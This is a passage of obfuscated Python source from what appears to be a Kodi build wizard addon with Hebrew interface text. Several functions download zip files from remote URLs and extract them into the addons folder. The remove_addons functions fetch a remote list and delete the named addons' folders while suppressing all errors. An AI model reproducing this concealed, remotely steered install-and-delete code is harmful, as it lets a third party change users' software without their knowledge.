							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5118
					except Exception as OOOOO0OO000OOOOOO :#line:5119
						wiz .log ("Error on Notifications Window: %s"%str (OOOOO0OO000OOOOOO ),xbmc .LOGERROR )#line:5120
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5122
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O000O00OOO00OO0 ),xbmc .LOGNOTICE )#line:5123
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5124
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5125
def checkidupdate ():#line:5131
				wiz .setS ("notedismiss","true")#line:5133
				OOOOO00O000O0OO0O =wiz .workingURL (NOTIFICATION )#line:5134
				O00OOOOOO000000OO =" Kodi Premium"#line:5136
				O0O0OOOO0O000OO00 =wiz .checkBuild (O00OOOOOO000000OO ,'gui')#line:5137
				O00OO0OO0000OOOOO =O00OOOOOO000000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5138
				if not wiz .workingURL (O0O0OOOO0O000OO00 )==True :return #line:5139
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5140
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00OOOOOO000000OO ),'','אנא המתן')#line:5141
				O0O000O00O0OOO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OO0OO0000OOOOO )#line:5142
				try :os .remove (O0O000O00O0OOO00O )#line:5143
				except :pass #line:5144
				logging .warning (O0O0OOOO0O000OO00 )#line:5145
				if 'google'in O0O0OOOO0O000OO00 :#line:5146
				   OO0OOO00O00O0O0O0 =googledrive_download (O0O0OOOO0O000OO00 ,O0O000O00O0OOO00O ,DP ,wiz .checkBuild (O00OOOOOO000000OO ,'filesize'))#line:5147
				else :#line:5150
				  downloader .download (O0O0OOOO0O000OO00 ,O0O000O00O0OOO00O ,DP )#line:5151
				xbmc .sleep (100 )#line:5152
				OOO0O0OOO0OO00O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOOOOO000000OO )#line:5153
				DP .update (0 ,OOO0O0OOO0OO00O0O ,'','אנא המתן')#line:5154
				extract .all (O0O000O00O0OOO00O ,HOME ,DP ,title =OOO0O0OOO0OO00O0O )#line:5155
				DP .close ()#line:5156
				wiz .defaultSkin ()#line:5157
				wiz .lookandFeelData ('save')#line:5158
				if KODIV >=18 :#line:5159
					skindialogsettind18 ()#line:5160
				if INSTALLMETHOD ==1 :OO0000000OOO0O000 =1 #line:5163
				elif INSTALLMETHOD ==2 :OO0000000OOO0O000 =0 #line:5164
				else :DP .close ()#line:5165
def gaiaserenaddon ():#line:5167
  OO000O0O00O0OO000 =(ADDON .getSetting ("gaiaseren"))#line:5168
  O0OOO000O00OOOO0O =(ADDON .getSetting ("auto_rd"))#line:5169
  if OO000O0O00O0OO000 =='true'and O0OOO000O00OOOO0O =='true':#line:5170
    OO000OO00O0OOOOO0 =(NEWFASTUPDATE )#line:5171
    O000OO0OO0000O000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5172
    O0O00OO0OO00000OO =xbmcgui .DialogProgress ()#line:5173
    O0O00OO0OO00000OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5174
    OOOO0O00OOO0O00O0 =os .path .join (PACKAGES ,'isr.zip')#line:5175
    OO0O000O0O0OOO0O0 =urllib2 .Request (OO000OO00O0OOOOO0 )#line:5176
    OO0OO0O0O0OO00000 =urllib2 .urlopen (OO0O000O0O0OOO0O0 )#line:5177
    O0O0O0OO00O0O00O0 =xbmcgui .DialogProgress ()#line:5179
    O0O0O0OO00O0O00O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5180
    O0O0O0OO00O0O00O0 .update (0 )#line:5181
    OO000O00O00OO00O0 =open (OOOO0O00OOO0O00O0 ,'wb')#line:5183
    try :#line:5185
      O0000O0000O0OOO00 =OO0OO0O0O0OO00000 .info ().getheader ('Content-Length').strip ()#line:5186
      OOOO0O0O00OO000O0 =True #line:5187
    except AttributeError :#line:5188
          OOOO0O0O00OO000O0 =False #line:5189
    if OOOO0O0O00OO000O0 :#line:5191
          O0000O0000O0OOO00 =int (O0000O0000O0OOO00 )#line:5192
    O0OOO0000O0OOOOOO =0 #line:5194
    O0OO00OO00OO000OO =time .time ()#line:5195
    while True :#line:5196
          O00O00OOO00O0O0O0 =OO0OO0O0O0OO00000 .read (8192 )#line:5197
          if not O00O00OOO00O0O0O0 :#line:5198
              sys .stdout .write ('\n')#line:5199
              break #line:5200
          O0OOO0000O0OOOOOO +=len (O00O00OOO00O0O0O0 )#line:5202
          OO000O00O00OO00O0 .write (O00O00OOO00O0O0O0 )#line:5203
          if not OOOO0O0O00OO000O0 :#line:5205
              O0000O0000O0OOO00 =O0OOO0000O0OOOOOO #line:5206
          if O0O0O0OO00O0O00O0 .iscanceled ():#line:5207
             O0O0O0OO00O0O00O0 .close ()#line:5208
             try :#line:5209
              os .remove (OOOO0O00OOO0O00O0 )#line:5210
             except :#line:5211
              pass #line:5212
             break #line:5213
          O0OOOOOO00OOOO0O0 =float (O0OOO0000O0OOOOOO )/O0000O0000O0OOO00 #line:5214
          O0OOOOOO00OOOO0O0 =round (O0OOOOOO00OOOO0O0 *100 ,2 )#line:5215
          OO0OO00O0OO00O000 =O0OOO0000O0OOOOOO /(1024 *1024 )#line:5216
          O000O0O0000000O0O =O0000O0000O0OOO00 /(1024 *1024 )#line:5217
          OO0OO0O0O0O00OO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO0OO00O0OO00O000 ,'teal',O000O0O0000000O0O )#line:5218
          if (time .time ()-O0OO00OO00OO000OO )>0 :#line:5219
            O0OO0OOO0OO00O00O =O0OOO0000O0OOOOOO /(time .time ()-O0OO00OO00OO000OO )#line:5220
            O0OO0OOO0OO00O00O =O0OO0OOO0OO00O00O /1024 #line:5221
          else :#line:5222
           O0OO0OOO0OO00O00O =0 #line:5223
          O000O00OO0O00OO0O ='KB'#line:5224
          if O0OO0OOO0OO00O00O >=1024 :#line:5225
             O0OO0OOO0OO00O00O =O0OO0OOO0OO00O00O /1024 #line:5226
             O000O00OO0O00OO0O ='MB'#line:5227
          if O0OO0OOO0OO00O00O >0 and not O0OOOOOO00OOOO0O0 ==100 :#line:5228
              O0OO00000000O00OO =(O0000O0000O0OOO00 -O0OOO0000O0OOOOOO )/O0OO0OOO0OO00O00O #line:5229
          else :#line:5230
              O0OO00000000O00OO =0 #line:5231
          OOOOOOO0000OOO000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0OOO0OO00O00O ,O000O00OO0O00OO0O )#line:5232
          O0O0O0OO00O0O00O0 .update (int (O0OOOOOO00OOOO0O0 ),OO0OO0O0O0O00OO00 ,OOOOOOO0000OOO000 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5234
    O0O0OO0O0O0OOO0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5237
    OO000O00O00OO00O0 .close ()#line:5240
    extract .all (OOOO0O00OOO0O00O0 ,O0O0OO0O0O0OOO0O0 ,O0O0O0OO00O0O00O0 )#line:5241
    try :#line:5245
      os .remove (OOOO0O00OOO0O00O0 )#line:5246
    except :#line:5247
      pass #line:5248
def iptvsimpldownpc ():#line:5249
    OOO00OO0O000O000O =(IPTVSIMPL18PC )#line:5251
    OO00OO0O0OOO0O0OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5252
    O000OOOOO000000OO =xbmcgui .DialogProgress ()#line:5253
    O000OOOOO000000OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5254
    OO00O0O0OO0O00O0O =os .path .join (PACKAGES ,'isr.zip')#line:5255
    OOOOO0000OO0O0OOO =urllib2 .Request (OOO00OO0O000O000O )#line:5256
    OO00OOOOO0O0O0O0O =urllib2 .urlopen (OOOOO0000OO0O0OOO )#line:5257
    O00O000OOO00000OO =xbmcgui .DialogProgress ()#line:5259
    O00O000OOO00000OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5260
    O00O000OOO00000OO .update (0 )#line:5261
    O0000OOO000O00OOO =open (OO00O0O0OO0O00O0O ,'wb')#line:5263
    try :#line:5265
      OO0OO000OO00O000O =OO00OOOOO0O0O0O0O .info ().getheader ('Content-Length').strip ()#line:5266
      OOOOOOO0000OOOOO0 =True #line:5267
    except AttributeError :#line:5268
          OOOOOOO0000OOOOO0 =False #line:5269
    if OOOOOOO0000OOOOO0 :#line:5271
          OO0OO000OO00O000O =int (OO0OO000OO00O000O )#line:5272
    OOO00O0OOO000000O =0 #line:5274
    O0O0O0OO00OOO00OO =time .time ()#line:5275
    while True :#line:5276
          O000OO0OO0OO0O0O0 =OO00OOOOO0O0O0O0O .read (8192 )#line:5277
          if not O000OO0OO0OO0O0O0 :#line:5278
              sys .stdout .write ('\n')#line:5279
              break #line:5280
          OOO00O0OOO000000O +=len (O000OO0OO0OO0O0O0 )#line:5282
          O0000OOO000O00OOO .write (O000OO0OO0OO0O0O0 )#line:5283
          if not OOOOOOO0000OOOOO0 :#line:5285
              OO0OO000OO00O000O =OOO00O0OOO000000O #line:5286
          if O00O000OOO00000OO .iscanceled ():#line:5287
             O00O000OOO00000OO .close ()#line:5288
             try :#line:5289
              os .remove (OO00O0O0OO0O00O0O )#line:5290
             except :#line:5291
              pass #line:5292
             break #line:5293
          OO000O0O0O00O0000 =float (OOO00O0OOO000000O )/OO0OO000OO00O000O #line:5294
          OO000O0O0O00O0000 =round (OO000O0O0O00O0000 *100 ,2 )#line:5295
          OOO00OOO0000O0O00 =OOO00O0OOO000000O /(1024 *1024 )#line:5296
          O0OOO0OOO0O000OOO =OO0OO000OO00O000O /(1024 *1024 )#line:5297
          OO0OO000O000OO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO00OOO0000O0O00 ,'teal',O0OOO0OOO0O000OOO )#line:5298
          if (time .time ()-O0O0O0OO00OOO00OO )>0 :#line:5299
            OO0OOO0OO0O0OO0O0 =OOO00O0OOO000000O /(time .time ()-O0O0O0OO00OOO00OO )#line:5300
            OO0OOO0OO0O0OO0O0 =OO0OOO0OO0O0OO0O0 /1024 #line:5301
          else :#line:5302
           OO0OOO0OO0O0OO0O0 =0 #line:5303
          OOO000O00000O0O00 ='KB'#line:5304
          if OO0OOO0OO0O0OO0O0 >=1024 :#line:5305
             OO0OOO0OO0O0OO0O0 =OO0OOO0OO0O0OO0O0 /1024 #line:5306
             OOO000O00000O0O00 ='MB'#line:5307
          if OO0OOO0OO0O0OO0O0 >0 and not OO000O0O0O00O0000 ==100 :#line:5308
              O0OOOOOOOO0OOOOOO =(OO0OO000OO00O000O -OOO00O0OOO000000O )/OO0OOO0OO0O0OO0O0 #line:5309
          else :#line:5310
              O0OOOOOOOO0OOOOOO =0 #line:5311
          O0O0OOOOOOOO0O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0OOO0OO0O0OO0O0 ,OOO000O00000O0O00 )#line:5312
          O00O000OOO00000OO .update (int (OO000O0O0O00O0000 ),OO0OO000O000OO000 ,O0O0OOOOOOOO0O0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5314
    O00O00OO0OOOOOO00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5317
    O0000OOO000O00OOO .close ()#line:5320
    extract .all (OO00O0O0OO0O00O0O ,O00O00OO0OOOOOO00 ,O00O000OOO00000OO )#line:5321
    try :#line:5325
      os .remove (OO00O0O0OO0O00O0O )#line:5326
    except :#line:5327
      pass #line:5328
def iptvsimpldown ():#line:5329
    O000OO0000O000O0O =(IPTVSIMPL18 )#line:5331
    O0OO000000OOOO0O0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5332
    O0000O000000OOOOO =xbmcgui .DialogProgress ()#line:5333
    O0000O000000OOOOO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5334
    OO0O000OOO0000O0O =os .path .join (PACKAGES ,'isr.zip')#line:5335
    O0O00OO0000O0O0OO =urllib2 .Request (O000OO0000O000O0O )#line:5336
    OOOO0O0OOOO0O0000 =urllib2 .urlopen (O0O00OO0000O0O0OO )#line:5337
    OOOOO0OO0O00O00O0 =xbmcgui .DialogProgress ()#line:5339
    OOOOO0OO0O00O00O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5340
    OOOOO0OO0O00O00O0 .update (0 )#line:5341
    OO0OO0OOOOOO00OOO =open (OO0O000OOO0000O0O ,'wb')#line:5343
    try :#line:5345
      OOO00O0OO000O000O =OOOO0O0OOOO0O0000 .info ().getheader ('Content-Length').strip ()#line:5346
      O00OOOO00O0O0OO0O =True #line:5347
    except AttributeError :#line:5348
          O00OOOO00O0O0OO0O =False #line:5349
    if O00OOOO00O0O0OO0O :#line:5351
          OOO00O0OO000O000O =int (OOO00O0OO000O000O )#line:5352
    OOO0O00OO000O0OOO =0 #line:5354
    OO00OOO0O0000OOOO =time .time ()#line:5355
    while True :#line:5356
          OOOO0O0OO0O0O00OO =OOOO0O0OOOO0O0000 .read (8192 )#line:5357
          if not OOOO0O0OO0O0O00OO :#line:5358
              sys .stdout .write ('\n')#line:5359
              break #line:5360
          OOO0O00OO000O0OOO +=len (OOOO0O0OO0O0O00OO )#line:5362
          OO0OO0OOOOOO00OOO .write (OOOO0O0OO0O0O00OO )#line:5363
          if not O00OOOO00O0O0OO0O :#line:5365
              OOO00O0OO000O000O =OOO0O00OO000O0OOO #line:5366
          if OOOOO0OO0O00O00O0 .iscanceled ():#line:5367
             OOOOO0OO0O00O00O0 .close ()#line:5368
             try :#line:5369
              os .remove (OO0O000OOO0000O0O )#line:5370
             except :#line:5371
              pass #line:5372
             break #line:5373
          O0OO0OO00O0OO0O00 =float (OOO0O00OO000O0OOO )/OOO00O0OO000O000O #line:5374
          O0OO0OO00O0OO0O00 =round (O0OO0OO00O0OO0O00 *100 ,2 )#line:5375
          O0O0OOOO0000OOOO0 =OOO0O00OO000O0OOO /(1024 *1024 )#line:5376
          OO0O00OOO00OO000O =OOO00O0OO000O000O /(1024 *1024 )#line:5377
          OO00O0000OOO00O0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0OOOO0000OOOO0 ,'teal',OO0O00OOO00OO000O )#line:5378
          if (time .time ()-OO00OOO0O0000OOOO )>0 :#line:5379
            O0OOOOOOOOOOOOOO0 =OOO0O00OO000O0OOO /(time .time ()-OO00OOO0O0000OOOO )#line:5380
            O0OOOOOOOOOOOOOO0 =O0OOOOOOOOOOOOOO0 /1024 #line:5381
          else :#line:5382
           O0OOOOOOOOOOOOOO0 =0 #line:5383
          O00O0O00000O0OO0O ='KB'#line:5384
          if O0OOOOOOOOOOOOOO0 >=1024 :#line:5385
             O0OOOOOOOOOOOOOO0 =O0OOOOOOOOOOOOOO0 /1024 #line:5386
             O00O0O00000O0OO0O ='MB'#line:5387
          if O0OOOOOOOOOOOOOO0 >0 and not O0OO0OO00O0OO0O00 ==100 :#line:5388
              O0OO00O000000O000 =(OOO00O0OO000O000O -OOO0O00OO000O0OOO )/O0OOOOOOOOOOOOOO0 #line:5389
          else :#line:5390
              O0OO00O000000O000 =0 #line:5391
          OO0O0OO0O0O0O00O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOOOOOOOOOOOOO0 ,O00O0O00000O0OO0O )#line:5392
          OOOOO0OO0O00O00O0 .update (int (O0OO0OO00O0OO0O00 ),OO00O0000OOO00O0O ,OO0O0OO0O0O0O00O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5394
    OOOO0O0O000OOO0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5397
    OO0OO0OOOOOO00OOO .close ()#line:5400
    extract .all (OO0O000OOO0000O0O ,OOOO0O0O000OOO0OO ,OOOOO0OO0O00O00O0 )#line:5401
    try :#line:5405
      os .remove (OO0O000OOO0000O0O )#line:5406
    except :#line:5407
      pass #line:5408
def testnotify ():#line:5409
	OO00O0O0O0O0OOOOO =wiz .workingURL (NOTIFICATION )#line:5410
	if OO00O0O0O0O0OOOOO ==True :#line:5411
		try :#line:5412
			O0OO000O0OOO0O00O ,OO000OO0000OOOOO0 =wiz .splitNotify (NOTIFICATION )#line:5413
			if O0OO000O0OOO0O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5414
			if STARTP2 ()=='ok':#line:5415
				notify .notification (OO000OO0000OOOOO0 ,True )#line:5416
		except Exception as OO0O000O0OOOO0O0O :#line:5417
			wiz .log ("Error on Notifications Window: %s"%str (OO0O000O0OOOO0O0O ),xbmc .LOGERROR )#line:5418
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5419
def testnotify2 ():#line:5420
	O0O00OOO0O0O0O000 =wiz .workingURL (NOTIFICATION2 )#line:5421
	if O0O00OOO0O0O0O000 ==True :#line:5422
		try :#line:5423
			OOOO0OOOOOOOOOOOO ,O0O00OO000O00OOO0 =wiz .splitNotify (NOTIFICATION2 )#line:5424
			if OOOO0OOOOOOOOOOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5425
			if STARTP2 ()=='ok':#line:5426
				notify .notification2 (O0O00OO000O00OOO0 ,True )#line:5427
		except Exception as OOOO000OO000O0O0O :#line:5428
			wiz .log ("Error on Notifications Window: %s"%str (OOOO000OO000O0O0O ),xbmc .LOGERROR )#line:5429
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5430
def testnotify3 ():#line:5431
	OOO0O0OOO0O000O00 =wiz .workingURL (NOTIFICATION3 )#line:5432
	if OOO0O0OOO0O000O00 ==True :#line:5433
		try :#line:5434
			O000OO0OO0OOO0000 ,OOOOOO0OOOOOOO0OO =wiz .splitNotify (NOTIFICATION3 )#line:5435
			if O000OO0OO0OOO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5436
			if STARTP2 ()=='ok':#line:5437
				notify .notification3 (OOOOOO0OOOOOOO0OO ,True )#line:5438
		except Exception as OO00OO0O0O00O0OOO :#line:5439
			wiz .log ("Error on Notifications Window: %s"%str (OO00OO0O0O00O0OOO ),xbmc .LOGERROR )#line:5440
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5441
def servicemanual ():#line:5442
	O0OOO00OOO0OO0O0O =wiz .workingURL (HELPINFO )#line:5443
	if O0OOO00OOO0OO0O0O ==True :#line:5444
		try :#line:5445
			O0OOO0OOOOOO0000O ,OO000OO00000O0OOO =wiz .splitNotify (HELPINFO )#line:5446
			if O0OOO0OOOOOO0000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5447
			notify .helpinfo (OO000OO00000O0OOO ,True )#line:5448
		except Exception as O000O0000O0O00O00 :#line:5449
			wiz .log ("Error on Notifications Window: %s"%str (O000O0000O0O00O00 ),xbmc .LOGERROR )#line:5450
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5451
def testupdate ():#line:5453
	if BUILDNAME =="":#line:5454
		notify .updateWindow ()#line:5455
	else :#line:5456
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5457
def testfirst ():#line:5459
	notify .firstRun ()#line:5460
def testfirstRun ():#line:5462
	notify .firstRunSettings ()#line:5463
def fastinstall ():#line:5466
	notify .firstRuninstall ()#line:5467
def addDir (OOO0O0O00O00O0O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5474
	O0O0O0OO0O0O00000 =sys .argv [0 ]#line:5475
	if not mode ==None :O0O0O0OO0O0O00000 +="?mode=%s"%urllib .quote_plus (mode )#line:5476
	if not name ==None :O0O0O0OO0O0O00000 +="&name="+urllib .quote_plus (name )#line:5477
	if not url ==None :O0O0O0OO0O0O00000 +="&url="+urllib .quote_plus (url )#line:5478
	O0OO00OOO0O0OO0OO =True #line:5479
	if themeit :OOO0O0O00O00O0O0O =themeit %OOO0O0O00O00O0O0O #line:5480
	O0OO00000OOO0OO00 =xbmcgui .ListItem (OOO0O0O00O00O0O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5481
	O0OO00000OOO0OO00 .setInfo (type ="Video",infoLabels ={"Title":OOO0O0O00O00O0O0O ,"Plot":description })#line:5482
	O0OO00000OOO0OO00 .setProperty ("Fanart_Image",fanart )#line:5483
	if not menu ==None :O0OO00000OOO0OO00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5484
	O0OO00OOO0O0OO0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0O0OO0O0O00000 ,listitem =O0OO00000OOO0OO00 ,isFolder =True )#line:5485
	return O0OO00OOO0O0OO0OO #line:5486
def addFile (OOO000O0O0000OO00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5488
	O0O000O0OO000OOOO =sys .argv [0 ]#line:5489
	if not mode ==None :O0O000O0OO000OOOO +="?mode=%s"%urllib .quote_plus (mode )#line:5490
	if not name ==None :O0O000O0OO000OOOO +="&name="+urllib .quote_plus (name )#line:5491
	if not url ==None :O0O000O0OO000OOOO +="&url="+urllib .quote_plus (url )#line:5492
	OO000O0O0OO00OO00 =True #line:5493
	if themeit :OOO000O0O0000OO00 =themeit %OOO000O0O0000OO00 #line:5494
	O0OOOOOO0OO0OOO0O =xbmcgui .ListItem (OOO000O0O0000OO00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5495
	O0OOOOOO0OO0OOO0O .setInfo (type ="Video",infoLabels ={"Title":OOO000O0O0000OO00 ,"Plot":description })#line:5496
	O0OOOOOO0OO0OOO0O .setProperty ("Fanart_Image",fanart )#line:5497
	if not menu ==None :O0OOOOOO0OO0OOO0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5498
	OO000O0O0OO00OO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O000O0OO000OOOO ,listitem =O0OOOOOO0OO0OOO0O ,isFolder =False )#line:5499
	return OO000O0O0OO00OO00 #line:5500
def get_params ():#line:5502
	O00O0O0O000O00OOO =[]#line:5503
	OOO0OOO000O00O0OO =sys .argv [2 ]#line:5504
	if len (OOO0OOO000O00O0OO )>=2 :#line:5505
		O00000OOO000OO000 =sys .argv [2 ]#line:5506
		O0OO00000OOOOOO0O =O00000OOO000OO000 .replace ('?','')#line:5507
		if (O00000OOO000OO000 [len (O00000OOO000OO000 )-1 ]=='/'):#line:5508
			O00000OOO000OO000 =O00000OOO000OO000 [0 :len (O00000OOO000OO000 )-2 ]#line:5509
		O0O0OO0O0OOO0000O =O0OO00000OOOOOO0O .split ('&')#line:5510
		O00O0O0O000O00OOO ={}#line:5511
		for O00000000OOOOO00O in range (len (O0O0OO0O0OOO0000O )):#line:5512
			O00OOO00O0OOO0OO0 ={}#line:5513
			O00OOO00O0OOO0OO0 =O0O0OO0O0OOO0000O [O00000000OOOOO00O ].split ('=')#line:5514
			if (len (O00OOO00O0OOO0OO0 ))==2 :#line:5515
				O00O0O0O000O00OOO [O00OOO00O0OOO0OO0 [0 ]]=O00OOO00O0OOO0OO0 [1 ]#line:5516
		return O00O0O0O000O00OOO #line:5518
def remove_addons ():#line:5520
	try :#line:5521
			import json #line:5522
			O0O0O0OOO0000O0O0 =urllib2 .urlopen (remove_url ).readlines ()#line:5523
			for OO0000OOOOOO000OO in O0O0O0OOO0000O0O0 :#line:5524
				O0O00OOOO0OO0O0O0 =OO0000OOOOOO000OO .split (':')[1 ].strip ()#line:5526
				OO0O0O000OO0O000O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0O00OOOO0OO0O0O0 ,'false')#line:5527
				O00O0OO0O00OOO0O0 =xbmc .executeJSONRPC (OO0O0O000OO0O000O )#line:5528
				OO000O0O0000O0O0O =json .loads (O00O0OO0O00OOO0O0 )#line:5529
				OOO0O00O0000OO0OO =os .path .join (addons_folder ,O0O00OOOO0OO0O0O0 )#line:5531
				if os .path .exists (OOO0O00O0000OO0OO ):#line:5533
					for OOOOOO000O00OO0OO ,O0000O0OOO0OO0O0O ,OOOO0O00O0OOO000O in os .walk (OOO0O00O0000OO0OO ):#line:5534
						for O0O00O0OOOOOO0OO0 in OOOO0O00O0OOO000O :#line:5535
							os .unlink (os .path .join (OOOOOO000O00OO0OO ,O0O00O0OOOOOO0OO0 ))#line:5536
						for O0000O000O0OO000O in O0000O0OOO0OO0O0O :#line:5537
							shutil .rmtree (os .path .join (OOOOOO000O00OO0OO ,O0000O000O0OO000O ))#line:5538
					os .rmdir (OOO0O00O0000OO0OO )#line:5539
			xbmc .executebuiltin ('Container.Refresh')#line:5541
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5542
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5543
	except :pass #line:5544
def remove_addons2 ():#line:5545
	try :#line:5546
			import json #line:5547
			OO0000OO0000O000O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5548
			for OOO0OO0O0OO000O00 in OO0000OO0000O000O :#line:5549
				O0000O0OO00OO0O0O =OOO0OO0O0OO000O00 .split (':')[1 ].strip ()#line:5551
				OOO00OO0OOOO0OOO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0000O0OO00OO0O0O ,'false')#line:5552
				OO0OO0OO00OO000OO =xbmc .executeJSONRPC (OOO00OO0OOOO0OOO0 )#line:5553
				OOOO0O0O0O0O0O0OO =json .loads (OO0OO0OO00OO000OO )#line:5554
				O0O00OOO0OOOOOO00 =os .path .join (user_folder ,O0000O0OO00OO0O0O )#line:5556
				if os .path .exists (O0O00OOO0OOOOOO00 ):#line:5558
					for O00O00OO0O0OO0000 ,O0OOOOOOO0O0O00OO ,O0O0O0OOO00000O0O in os .walk (O0O00OOO0OOOOOO00 ):#line:5559
						for O00OO0OO00O0O0000 in O0O0O0OOO00000O0O :#line:5560
							os .unlink (os .path .join (O00O00OO0O0OO0000 ,O00OO0OO00O0O0000 ))#line:5561
						for O0OO000O0OO0O00O0 in O0OOOOOOO0O0O00OO :#line:5562
							shutil .rmtree (os .path .join (O00O00OO0O0OO0000 ,O0OO000O0OO0O00O0 ))#line:5563
					os .rmdir (O0O00OOO0OOOOOO00 )#line:5564
	except :pass #line:5566
params =get_params ()#line:5567
url =None #line:5568
name =None #line:5569
mode =None #line:5570
try :mode =urllib .unquote_plus (params ["mode"])#line:5572
except :pass #line:5573
try :name =urllib .unquote_plus (params ["name"])#line:5574
except :pass #line:5575
try :url =urllib .unquote_plus (params ["url"])#line:5576
except :pass #line:5577
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5579
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5580
def setView (OO0O0O0OOO0O0O00O ,O0000OO0OOOO00O00 ):#line:5581
	if wiz .getS ('auto-view')=='true':#line:5582
		OO00OO0OO0O000OOO =wiz .getS (O0000OO0OOOO00O00 )#line:5583
